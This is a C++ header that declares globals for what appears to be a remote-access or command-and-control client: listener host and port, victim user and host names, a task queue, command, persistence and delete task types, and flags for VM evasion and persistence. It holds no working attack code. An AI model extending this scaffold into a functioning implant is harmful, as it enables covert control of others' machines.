#ifndef __GLOBALS_H__INCLUDED__
#define __GLOBALS_H__INCLUDED__

#include <nlohmann/json.hpp>
#include <iostream>
#include <string>

using namespace nlohmann;

//net variables
extern std::string host;
extern std::string port;
extern int version; //change to 20?

extern json listener_json;

//Vars
//static client id
extern std::string client_id;
//project id
extern std::string project_id;
//expiration date
extern std::string expiration_date; 
//os name
extern std::string os_name;
//user name
extern std::string user_name;
//hostname
extern std::string host_name;
//client name
extern std::string client_name;
//UID
extern int client_UID;
//task array
extern json task_array;
//log array
extern json log_array;
//log output
extern std::string log_output;
//settings
extern bool NO_VM;
extern bool PERSIST_ON;
extern int sleep_time;
//enums
enum TASK_STATUS { NOTASK, TASK, CONNERROR };
enum TASK_TYPE {COMMAND, CONFIG, PERSIST, PING, SHUTDOWN, DELETE};
enum RES_STATUS { RES_SUCCESS, RES_FAIL };
//connection bool
extern bool CONN_OK;

#endif